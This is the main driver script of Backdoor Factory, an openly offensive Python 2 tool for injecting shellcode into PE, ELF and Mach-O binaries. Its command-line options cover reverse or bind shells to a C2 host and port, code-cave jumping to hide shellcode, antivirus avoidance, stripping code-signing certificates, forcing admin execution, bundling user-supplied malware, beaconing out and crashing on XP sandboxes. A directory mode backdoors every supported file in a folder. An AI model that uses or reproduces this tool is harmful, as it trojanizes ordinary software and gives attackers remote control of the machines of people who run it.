#!/usr/bin/env python
'''
BackdoorFactory (BDF) v3 - FOUNTAINPATCH

Many thanks to Ryan O'Neill --ryan 'at' codeslum <d ot> org--
Without him, I would still be trying to do stupid things
with the elf format.

Also thanks to Silvio Cesare with his 1998 paper
(http://vxheaven.org/lib/vsc01.html) which these ELF patching
techniques are based on.

Special thanks to Travis Morrow for poking holes in my ideas.

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

import sys
import os
import signal
import time
from random import choice
from optparse import OptionParser
from pebin import pebin
from elfbin import elfbin
from machobin import machobin


def signal_handler(signal, frame):
        print '\nProgram Exit'
        sys.exit(0)


class bdfMain():

    version = """\
         Version:   3.1.3
         """

    author = """\
         Author:    Joshua Pitts
         Email:     the.midnite.runr[-at ]gmail<d o-t>com
         Twitter:   @midnite_runr
         IRC:       freenode.net #BDFactory
         """

    #ASCII ART
    menu = ["-.(`-')  (`-')  _           <-"
            ".(`-') _(`-')                            (`-')\n"
            "__( OO)  (OO ).-/  _         __( OO)"
            "( (OO ).->     .->        .->   <-.(OO )  \n"
            "'-'---.\  / ,---.   \-,-----.'-'. ,--"
            ".\    .'_ (`-')----. (`-')----. ,------,) \n"
            "| .-. (/  | \ /`.\   |  .--./|  .'   /"
            "'`'-..__)( OO).-.  '( OO).-.  '|   /`. ' \n"
            "| '-' `.) '-'|_.' | /_) (`-')|      /)"
            "|  |  ' |( _) | |  |( _) | |  ||  |_.' | \n"
            "| /`'.  |(|  .-.  | ||  |OO )|  .   ' |"
            "  |  / : \|  |)|  | \|  |)|  ||  .   .' \n"
            "| '--'  / |  | |  |(_'  '--'\|  |\   \|"
            "  '-'  /  '  '-'  '  '  '-'  '|  |\  \  \n"
            "`------'  `--' `--'   `-----'`--' '--'"
            "`------'    `-----'    `-----' `--' '--' \n"
            "           (`-')  _           (`-')     "
            "              (`-')                    \n"
            "   <-.     (OO ).-/  _        ( OO).-> "
            "      .->   <-.(OO )      .->           \n"
            "(`-')-----./ ,---.   \-,-----./    '._"
            "  (`-')----. ,------,) ,--.'  ,-.        \n"
            "(OO|(_\---'| \ /`.\   |  .--./|'--...__)"
            "( OO).-.  '|   /`. '(`-')'.'  /        \n"
            " / |  '--. '-'|_.' | /_) (`-')`--.  .--'"
            "( _) | |  ||  |_.' |(OO \    /         \n"
            " \_)  .--'(|  .-.  | ||  |OO )   |  |   "
            " \|  |)|  ||  .   .' |  /   /)         \n"
            "  `|  |_)  |  | |  |(_'  '--'\   |  |    "
            " '  '-'  '|  |\  \  `-/   /`          \n"
            "   `--'    `--' `--'   `-----'   `--'    "
            "  `-----' `--' '--'   `--'            \n",

            "__________               "
            " __       .___                   \n"
            "\______   \_____    ____ "
            "|  | __ __| _/____   ___________ \n"
            " |    |  _/\__  \ _/ ___\|"
            "  |/ // __ |/  _ \ /  _ \_  __ \ \n"
            " |    |   \ / __ \\\\  \__"
            "_|    </ /_/ (  <_> |  <_> )  | \/\n"
            " |______  /(____  /\___  >"
            "__|_ \____ |\____/ \____/|__|   \n"
            "        \/      \/     \/"
            "     \/    \/                    \n"
            "___________              "
            "__                               \n"
            "\_   _____/____    _____/"
            "  |_  ___________ ___.__.        \n"
            " |    __) \__  \ _/ ___\ "
            "  __\/  _ \_  __ <   |  |        \n"
            " |     \   / __ \\\\  \__"
            "_|  | (  <_> )  | \/\___  |        \n"
            " \___  /  (____  /\___  >_"
            "_|  \____/|__|   / ____|        \n"
            "     \/        \/     \/  "
            "                 \/             \n",

            "    ____  ____  ______  "
            "         __      \n"
            "   / __ )/ __ \/ ____/___ "
            "______/ /_____  _______  __\n"
            "  / __  / / / / /_  / __ `/"
            " ___/ __/ __ \/ ___/ / / /\n"
            " / /_/ / /_/ / __/ / /_/ /"
            " /__/ /_/ /_/ / /  / /_/ /\n"
            "/_____/_____/_/    \__,_/"
            "\___/\__/\____/_/   \__, /\n"
            "                         "
            "                   /____/\n"]

    signal.signal(signal.SIGINT, signal_handler)

    parser = OptionParser()
    parser.add_option("-f", "--file", dest="FILE", action="store",
                      type="string",
                      help="File to backdoor")
    parser.add_option("-s", "--shell", default="show", dest="SHELL",
                      action="store", type="string",
                      help="Payloads that are available for use."
                      " Use 'show' to see payloads."
                      )
    parser.add_option("-H", "--hostip", default=None, dest="HOST",
                      action="store", type="string",
                      help="IP of the C2 for reverse connections.")
    parser.add_option("-P", "--port", default=None, dest="PORT",
                      action="store", type="int",
                      help="The port to either connect back to for reverse "
                      "shells or to listen on for bind shells")
    parser.add_option("-J", "--cave_jumping", dest="CAVE_JUMPING",
                      default=False, action="store_true",
                      help="Select this options if you want to use code cave"
                      " jumping to further hide your shellcode in the binary."
                      )
    parser.add_option("-a", "--add_new_section", default=False,
                      dest="ADD_SECTION", action="store_true",
                      help="Mandating that a new section be added to the "
                      "exe (better success) but less av avoidance")
    parser.add_option("-U", "--user_shellcode", default=None,
                      dest="SUPPLIED_SHELLCODE", action="store",
                      help="User supplied shellcode, make sure that it matches"
                      " the architecture that you are targeting."
                      )
    parser.add_option("-c", "--cave", default=False, dest="FIND_CAVES",
                      action="store_true",
                      help="The cave flag will find code caves that "
                      "can be used for stashing shellcode. "
                      "This will print to all the code caves "
                      "of a specific size."
                      "The -l flag can be use with this setting.")
    parser.add_option("-l", "--shell_length", default=380, dest="SHELL_LEN",
                      action="store", type="int",
                      help="For use with -c to help find code "
                      "caves of different sizes")
    parser.add_option("-o", "--output-file", default=None, dest="OUTPUT",
                      action="store", type="string",
                      help="The backdoor output file")
    parser.add_option("-n", "--section", default="sdata", dest="NSECTION",
                      action="store", type="string",
                      help="New section name must be "
                      "less than seven characters")
    parser.add_option("-d", "--directory", dest="DIR", action="store",
                      type="string",
                      help="This is the location of the files that "
                      "you want to backdoor. "
                      "You can make a directory of file backdooring faster by "
                      "forcing the attaching of a codecave "
                      "to the exe by using the -a setting.")
    parser.add_option("-w", "--change_access", default=True,
                      dest="CHANGE_ACCESS", action="store_false",
                      help="This flag changes the section that houses "
                      "the codecave to RWE. Sometimes this is necessary. "
                      "Enabled by default. If disabled, the "
                      "backdoor may fail.")
    parser.add_option("-i", "--injector", default=False, dest="INJECTOR",
                      action="store_true",
                      help="This command turns the backdoor factory in a "
                      "hunt and shellcode inject type of mechanism. Edit "
                      "the target settings in the injector module.")
    parser.add_option("-u", "--suffix", default=".old", dest="SUFFIX",
                      action="store", type="string",
                      help="For use with injector, places a suffix"
                      " on the original file for easy recovery")
    parser.add_option("-D", "--delete_original", dest="DELETE_ORIGINAL",
                      default=False, action="store_true",
                      help="For use with injector module.  This command"
                      " deletes the original file.  Not for use in production "
                      "systems.  *Author not responsible for stupid uses.*")
    parser.add_option("-O", "--disk_offset", dest="DISK_OFFSET", default=0,
                      type="int", action="store",
                      help="Starting point on disk offset, in bytes. "
                      "Some authors want to obfuscate their on disk offset "
                      "to avoid reverse engineering, if you find one of those "
                      "files use this flag, after you find the offset.")
    parser.add_option("-S", "--support_check", dest="SUPPORT_CHECK",
                      default=False, action="store_true",
                      help="To determine if the file is supported by BDF prior"
                      " to backdooring the file. For use by itself or with "
                      "verbose. This check happens automatically if the "
                      "backdooring is attempted."
                      )
    parser.add_option("-M", "--cave-miner", dest="CAVE_MINER", default=False, action="store_true",
                      help="Future use, to help determine smallest shellcode possible in a PE file"
                      )
    parser.add_option("-q", "--no_banner", dest="NO_BANNER", default=False, action="store_true",
                      help="Kills the banner."
                      )
    parser.add_option("-v", "--verbose", default=False, dest="VERBOSE",
                      action="store_true",
                      help="For debug information output.")
    parser.add_option("-T", "--image-type", dest="IMAGE_TYPE", default="ALL",
                      type='string',
                      action="store", help="ALL, x86, or x64 type binaries only. Default=ALL")
    parser.add_option("-Z", "--zero_cert", dest="ZERO_CERT", default=True, action="store_false",
                      help="Allows for the overwriting of the pointer to the PE certificate table"
                      " effectively removing the certificate from the binary for all intents"
                      " and purposes."
                      )
    parser.add_option("-R", "--runas_admin", dest="RUNAS_ADMIN", default=False, action="store_true",
                      help="EXPERIMENTAL "
                      "Checks the PE binaries for \'requestedExecutionLevel level=\"highestAvailable\"\'"
                      ". If this string is included in the binary, it must run as system/admin. If not "
		      "in Support Check mode it will attmept to patch highestAvailable into the manifest " 
		      "if requestedExecutionLevel entry exists."
                      )
    parser.add_option("-L", "--patch_dll", dest="PATCH_DLL", default=True, action="store_false",
                      help="Use this setting if you DON'T want to patch DLLs. Patches by default."
                      )
    parser.add_option("-F", "--fat_priority", dest="FAT_PRIORITY", default="x64", action="store",
                      help="For MACH-O format. If fat file, focus on which arch to patch. Default "
                      "is x64. To force x86 use -F x86, to force both archs use -F ALL."
                      )
    parser.add_option("-B", "--beacon", dest="BEACON", default=15, action="store", type="int",
                      help="For payloads that have the ability to beacon out, set the time in secs"
                      )
    parser.add_option("-m", "--patch-method", dest="PATCH_METHOD", default="manual", action="store",
                      type="string", help="Patching methods for PE files, 'manual','automatic', "
                      "and onionduke")
    parser.add_option("-b", "--user_malware", dest="SUPPLIED_BINARY", default=None, action="store",
                      help="For onionduke. Provide your desired binary.")
    parser.add_option("-X", "--xp_mode", dest="XP_MODE", default=False, action="store_true",
                      help="Default: DO NOT support for XP legacy machines, use -X to support XP"
                      ". By default the binary will crash on XP machines (e.g. sandboxes)"
                      )

    (options, args) = parser.parse_args()

    def basicDiscovery(FILE):
        macho_supported = ['\xcf\xfa\xed\xfe', '\xca\xfe\xba\xbe',
                           '\xce\xfa\xed\xfe',
                           ]

        testBinary = open(FILE, 'rb')
        header = testBinary.read(4)
        testBinary.close()
        if 'MZ' in header:
            return 'PE'
        elif 'ELF' in header:
            return 'ELF'
        elif header in macho_supported:
            return "MACHO"
        else:
            'Only support ELF, PE, and MACH-O file formats'
            return None

    if options.NO_BANNER is False:
        print choice(menu)
        print author
        print version
        time.sleep(1)
    else:
        print "\t Backdoor Factory"
        print author
        print version

    if options.DIR:
        for root, subFolders, files in os.walk(options.DIR):
            for _file in files:
                options.FILE = os.path.join(root, _file)
                if os.path.isdir(options.FILE) is True:
                    print "Directory found, continuing"
                    continue
                is_supported = basicDiscovery(options.FILE)
                if is_supported is "PE":
                    supported_file = pebin(options.FILE,
                                           options.OUTPUT,
                                           options.SHELL,
                                           options.NSECTION,
                                           options.DISK_OFFSET,
                                           options.ADD_SECTION,
                                           options.CAVE_JUMPING,
                                           options.PORT,
                                           options.HOST,
                                           options.SUPPLIED_SHELLCODE,
                                           options.INJECTOR,
                                           options.CHANGE_ACCESS,
                                           options.VERBOSE,
                                           options.SUPPORT_CHECK,
                                           options.SHELL_LEN,
                                           options.FIND_CAVES,
                                           options.SUFFIX,
                                           options.DELETE_ORIGINAL,
                                           options.CAVE_MINER,
                                           options.IMAGE_TYPE,
                                           options.ZERO_CERT,
                                           options.RUNAS_ADMIN,
                                           options.PATCH_DLL,
                                           options.PATCH_METHOD,
                                           options.SUPPLIED_BINARY,
                                           options.XP_MODE
                                           )
                elif is_supported is "ELF":
                    supported_file = elfbin(options.FILE,
                                            options.OUTPUT,
                                            options.SHELL,
                                            options.HOST,
                                            options.PORT,
                                            options.SUPPORT_CHECK,
                                            options.FIND_CAVES,
                                            options.SHELL_LEN,
                                            options.SUPPLIED_SHELLCODE,
                                            options.IMAGE_TYPE
                                            )
                elif is_supported is "MACHO":
                    supported_file = machobin(options.FILE,
                                              options.OUTPUT,
                                              options.SHELL,
                                              options.HOST,
                                              options.PORT,
                                              options.SUPPORT_CHECK,
                                              options.SUPPLIED_SHELLCODE,
                                              options.FAT_PRIORITY,
                                              options.BEACON
                                              )

                if options.SUPPORT_CHECK is True:
                    if os.path.isfile(options.FILE):
                        is_supported = False
                print "file", options.FILE
                try:
                    is_supported = supported_file.support_check()
                except Exception, e:
                    is_supported = False
                    print 'Exception:', str(e), '%s' % options.FILE
                if is_supported is False or is_supported is None:
                    print "%s is not supported." % options.FILE
                            #continue
                else:
                    print "%s is supported." % options.FILE
                #    if supported_file.flItms['runas_admin'] is True:
                #        print "%s must be run as admin." % options.FILE
                print "*" * 50

        if options.SUPPORT_CHECK is True:
            sys.exit()

        print ("You are going to backdoor the following "
               "items in the %s directory:"
               % options.DIR)
        dirlisting = os.listdir(options.DIR)
        for item in dirlisting:
            print "     {0}".format(item)
        answer = raw_input("Do you want to continue? (yes/no) ")
        if 'yes' in answer.lower():
            for item in dirlisting:
                #print item
                print "*" * 50
                options.File = options.DIR + '/' + item
                if os.path.isdir(options.FILE) is True:
                    print "Directory found, continuing"
                    continue

                print ("backdooring file %s" % item)
                result = None
                is_supported = basicDiscovery(options.FILE)
                try:
                    if is_supported is "PE":
                        supported_file = pebin(options.FILE,
                                               options.OUTPUT,
                                               options.SHELL,
                                               options.NSECTION,
                                               options.DISK_OFFSET,
                                               options.ADD_SECTION,
                                               options.CAVE_JUMPING,
                                               options.PORT,
                                               options.HOST,
                                               options.SUPPLIED_SHELLCODE,
                                               options.INJECTOR,
                                               options.CHANGE_ACCESS,
                                               options.VERBOSE,
                                               options.SUPPORT_CHECK,
                                               options.SHELL_LEN,
                                               options.FIND_CAVES,
                                               options.SUFFIX,
                                               options.DELETE_ORIGINAL,
                                               options.CAVE_MINER,
                                               options.IMAGE_TYPE,
                                               options.ZERO_CERT,
                                               options.RUNAS_ADMIN,
                                               options.PATCH_DLL,
                                               options.PATCH_METHOD,
                                               options.SUPPLIED_BINARY,
                                               options.XP_MODE,
                                               )
                        supported_file.OUTPUT = None
                        supported_file.output_options()
                        result = supported_file.patch_pe()
                    elif is_supported is "ELF":
                        supported_file = elfbin(options.FILE,
                                                options.OUTPUT,
                                                options.SHELL,
                                                options.HOST,
                                                options.PORT,
                                                options.SUPPORT_CHECK,
                                                options.FIND_CAVES,
                                                options.SHELL_LEN,
                                                options.SUPPLIED_SHELLCODE,
                                                options.IMAGE_TYPE
                                                )

                        supported_file.OUTPUT = None
                        supported_file.output_options()
                        result = supported_file.patch_elf()

                    elif is_supported is "MACHO":
                        supported_file = machobin(options.FILE,
                                                  options.OUTPUT,
                                                  options.SHELL,
                                                  options.HOST,
                                                  options.PORT,
                                                  options.SUPPORT_CHECK,
                                                  options.SUPPLIED_SHELLCODE,
                                                  options.FAT_PRIORITY,
                                                  options.BEACON
                                                  )
                        supported_file.OUTPUT = None
                        supported_file.output_options()
                        result = supported_file.patch_macho()

                    if result is None:
                        print 'Not Supported. Continuing'
                        continue
                    else:
                        print ("[*] File {0} is in backdoored "
                               "directory".format(supported_file.FILE))
                except Exception as e:
                    print "DIR ERROR", str(e)
        else:
            print("Goodbye")

        sys.exit()

    if options.INJECTOR is True:
        supported_file = pebin(options.FILE,
                               options.OUTPUT,
                               options.SHELL,
                               options.NSECTION,
                               options.DISK_OFFSET,
                               options.ADD_SECTION,
                               options.CAVE_JUMPING,
                               options.PORT,
                               options.HOST,
                               options.SUPPLIED_SHELLCODE,
                               options.INJECTOR,
                               options.CHANGE_ACCESS,
                               options.VERBOSE,
                               options.SUPPORT_CHECK,
                               options.SHELL_LEN,
                               options.FIND_CAVES,
                               options.SUFFIX,
                               options.DELETE_ORIGINAL,
                               options.IMAGE_TYPE,
                               options.ZERO_CERT,
                               options.RUNAS_ADMIN,
                               options.PATCH_DLL,
                               options.PATCH_METHOD,
                               options.SUPPLIED_BINARY,
                               options.XP_MODE,
                               )
        supported_file.injector()
        sys.exit()

    if not options.FILE:
        parser.print_help()
        sys.exit()

    #OUTPUT = output_options(options.FILE, options.OUTPUT)
    is_supported = basicDiscovery(options.FILE)
    if is_supported is "PE":
        supported_file = pebin(options.FILE,
                               options.OUTPUT,
                               options.SHELL,
                               options.NSECTION,
                               options.DISK_OFFSET,
                               options.ADD_SECTION,
                               options.CAVE_JUMPING,
                               options.PORT,
                               options.HOST,
                               options.SUPPLIED_SHELLCODE,
                               options.INJECTOR,
                               options.CHANGE_ACCESS,
                               options.VERBOSE,
                               options.SUPPORT_CHECK,
                               options.SHELL_LEN,
                               options.FIND_CAVES,
                               options.SUFFIX,
                               options.DELETE_ORIGINAL,
                               options.CAVE_MINER,
                               options.IMAGE_TYPE,
                               options.ZERO_CERT,
                               options.RUNAS_ADMIN,
                               options.PATCH_DLL,
                               options.PATCH_METHOD,
                               options.SUPPLIED_BINARY,
                               options.XP_MODE,
                               )
    elif is_supported is "ELF":
        supported_file = elfbin(options.FILE,
                                options.OUTPUT,
                                options.SHELL,
                                options.HOST,
                                options.PORT,
                                options.SUPPORT_CHECK,
                                options.FIND_CAVES,
                                options.SHELL_LEN,
                                options.SUPPLIED_SHELLCODE,
                                options.IMAGE_TYPE
                                )

    elif is_supported is "MACHO":
        supported_file = machobin(options.FILE,
                                  options.OUTPUT,
                                  options.SHELL,
                                  options.HOST,
                                  options.PORT,
                                  options.SUPPORT_CHECK,
                                  options.SUPPLIED_SHELLCODE,
                                  options.FAT_PRIORITY,
                                  options.BEACON
                                  )

    else:
        print "Not supported."
        sys.exit()
    result = supported_file.run_this()
    if result is True and options.SUPPORT_CHECK is False:
        print "File {0} is in the 'backdoored' directory".format(os.path.basename(supported_file.OUTPUT))


    #END BDF MAIN

if __name__ == "__main__":

    bdfMain()
